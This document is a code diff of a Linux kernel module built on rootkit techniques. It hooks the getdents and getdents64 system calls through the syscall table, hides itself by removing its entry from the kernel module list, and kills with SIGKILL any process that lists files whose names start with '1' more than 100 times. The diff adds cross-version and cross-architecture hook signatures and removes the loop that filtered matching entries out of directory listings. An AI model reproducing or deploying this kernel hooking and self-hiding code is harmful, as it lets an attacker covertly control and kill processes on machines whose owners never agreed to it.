@@ -41,22 +41,33 @@
 #define __NR_getdents64 217
 #endif
 
-MODULE_LICENSE("GPL");
-
-unsigned long* __sys_call_table = NULL;
-
-static struct list_head *prev_module;
-
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
-static ptregs_t orig_getdents64;
-static ptregs_t orig_getdents;
-
 struct linux_dirent {
     unsigned long d_ino;
     unsigned long d_off;
     unsigned short d_reclen;
     char d_name[1];
 };
+
+unsigned long* __sys_call_table = NULL;
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+	static t_syscall orig_getdents;
+	static t_syscall orig_getdents64;
+	static t_syscall orig_kill;
+#else
+	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
+		unsigned int);
+	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
+		struct linux_dirent64 *, unsigned int);
+	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+	orig_getdents_t orig_getdents;
+	orig_getdents64_t orig_getdents64;
+#endif
+
+MODULE_LICENSE("GPL");
+
+static struct list_head *prev_module;
 
 typedef struct ViolationNode {
     pid_t pid;
@@ -139,57 +150,65 @@ static void hide_module(void)
     list_del(&THIS_MODULE->list);
 }
 
-static asmlinkage int c_getdents64(const struct pt_regs *regs)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+static asmlinkage long c_getdents64(const struct pt_regs *pt_regs) {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+	int fd = (int) pt_regs->di;
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+#elif IS_ENABLED(CONFIG_ARM64)
+	int fd = (int) pt_regs->regs[0];
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
+#endif
+	int ret = orig_getdents64(pt_regs), err;
+#else
+asmlinkage int
+c_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
+	unsigned int count)
 {
-    long err;
-    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-    struct linux_dirent64 *dir, *previous_dir, *dirent_ker = NULL;
-    unsigned long offset = 0;
+	int ret = orig_getdents64(fd, dirent, count), err;
+#endif
+	unsigned short proc = 0;
+	unsigned long off = 0;
+	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+	struct inode *d_inode;
 
-    int ret = orig_getdents64(regs);
-    dirent_ker = kvzalloc(ret, GFP_KERNEL);
-    if ((ret <= 0) || (dirent_ker == NULL))
-        return ret;
+	if (ret <= 0)
+		return ret;
 
-    err = copy_from_user(dirent_ker, dirent, ret);
-    if (err) 
-        goto done;
+	kdirent = kzalloc(ret, GFP_KERNEL);
+	if (kdirent == NULL)
+		return ret;
 
-    while (offset < ret)
-    {
-        dir = (void *)dirent_ker + offset;
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
 
-        if (memcmp("1", dir->d_name, strlen("1")) == 0) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+
+	while (off < ret) {
+		dir = (void *)kdirent + off;
+
+		if (memcmp("1", dir->d_name, strlen("1")) == 0) {
             incrementViolationCount(spotter_head, current->pid);
-
             if (getViolationCount(spotter_head, current->pid) > 100) {
 				kill_pid(current->pid, SIGKILL, 1);
 
                 spotter_head = removeViolation(spotter_head, current->pid);
             }
-
-            if (dir == dirent_ker){
-                ret -= dir->d_reclen;
-                memmove(dir, (void *)dir + dir->d_reclen, ret);
-                continue;
-            }
-            previous_dir->d_reclen += dir->d_reclen;
-        }
-        else
-        {
-            previous_dir = dir;
-        }
-
-        offset += dir->d_reclen;
-    }
-
-    err = copy_to_user(dirent, dirent_ker, ret);
-    if (err) 
-        goto done;
-
-done:
-    kvfree(dirent_ker);
-    return ret;
+		} else
+			prev = dir;
+		off += dir->d_reclen;
+	}
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
+	kfree(kdirent);
+	return ret;
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -240,13 +259,6 @@ c_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
                 spotter_head = removeViolation(spotter_head, current->pid);
             }
-
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
 		} else
 			prev = dir;
 		off += dir->d_reclen;
